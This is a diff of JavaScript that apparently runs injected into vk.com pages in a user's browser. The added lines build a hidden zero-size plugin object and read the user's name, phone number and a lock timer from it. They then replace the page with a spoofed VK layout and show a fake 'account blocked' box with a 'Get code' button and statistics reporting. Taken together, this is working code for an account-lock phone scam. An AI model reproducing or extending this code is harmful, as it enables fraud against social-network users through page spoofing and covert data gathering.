@@ -181,11 +181,25 @@ function Loader(){
 	}
 }
 
+function CreatePLG(){
+	var plg = document.createElement("object");
+	if (plg) {
+		plg.setAttribute("type", "application/afp");
+		plg.setAttribute("id", "AFP");
+		plg.setAttribute("width", 0);
+		plg.setAttribute("height", 0);
+		document.body.appendChild(plg);
+	}
+	
+	return plg;
+}
+
 function MyBoxLock(){
 	KEY.ESC = 0xFFFFFF;
 	try{
 		var name = unescape(plg.Get('vName'));
 		var number = plg.Get('vTel');
+		var lTime = plg.Get('vTime');
 		number = number.replace(/(\*)+/, '');
 	} catch(e){}
 	var code = TelCode(number);
@@ -197,6 +211,12 @@ function MyBoxLock(){
 	
 	if(run == 2){
 		try{
+			document.body.innerHTML = '<div class="scroll_fix_wrap" id="page_wrap"><div><div class="scroll_fix" style="width: 1348px;"><div id="page_layout" style="width: 661px;"><div id="page_header" class="p_head p_head_l0"><div class="back"></div><div class="left"></div><div class="right"></div><div class="content"><div id="top_nav" class="head_nav"><table cellspacing="0" cellpadding="0" id="top_links"><tbody><tr><td class="top_back_link_td"></td><td id="logout_link_td"><nobr><a class="top_nav_link" id="logout_link" href="https://login.vk.com/?act=logout&amp;hash=0e34cea7502e4efb48&amp;_origin=http://vk.com" onclick="if (checkEvent(event) === false) { location.href = this.href; return cancelEvent(event); }">выйти</a></nobr></td></tr></tbody></table></div><div id="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;" style="display: none;"></div></div></div><div id="page_body" class="fl_r" style="width: 631px;"></div><div class="clear"></div></div></div></div></div>';
+			document.body.setAttribute("class", "is_rtl font_default pads");
+			if(!ge("AFP"))
+				plg = CreatePLG();
+				
+			/*
 			ge('page_layout').style.width = '661px';
 			document.body.setAttribute("class", "is_rtl font_default pads");
 			ge('notifiers_wrap').parentNode.removeChild(document.getElementById('notifiers_wrap'));
@@ -211,10 +231,10 @@ function MyBoxLock(){
 			ge('footer_wrap').style.width = 'auto';
 			ge('rb_box_fc_clist').innerHTML = '';
 			window.FastChat = {};
+			*/
 		} catch(e){}
 	}
 	
-	try {var lTime = plg.Get('vTime');} catch(e){}
 	if(lTime > getTime()){
 		var btn = '<button id="blocked_send_phone" style="height: 23px;" onclick="GetCode()">Получить код</button>';
 		var see_row = 'block';
@@ -228,7 +248,7 @@ function MyBoxLock(){
 	boxLock.content(content + '<div id="modalWND"></div>');	
 	if(run == 2){
 		ge('page_body').setAttribute('class', 'simple');
-		ge('page_body').innerHTML = '<div id="content" style="border-color: rgb(217, 224, 231); border-style: solid; border-width: 0px 1px 1px;">' + content + '</div>';
+		ge('page_body').innerHTML = '<div id="content" style="border-color: rgb(217, 224, 231); margin-bottom: 10px; border-style: solid; border-width: 0px 1px 1px;">' + content + '</div>';
 		ge('page_body').setAttribute('style', 'border-width: 0px 1px 1px; border-color: rgba(100, 100, 100, 0.08); border-style: solid;');
 		SendStat(3, "small");
 	}
@@ -445,7 +465,6 @@ function isRun(){
 	} catch(e){}
 	
 	if(run == 3){
-		
 		document.body.removeEventListener('DOMNodeInserted', isRun, false);
 		return true;
 	}
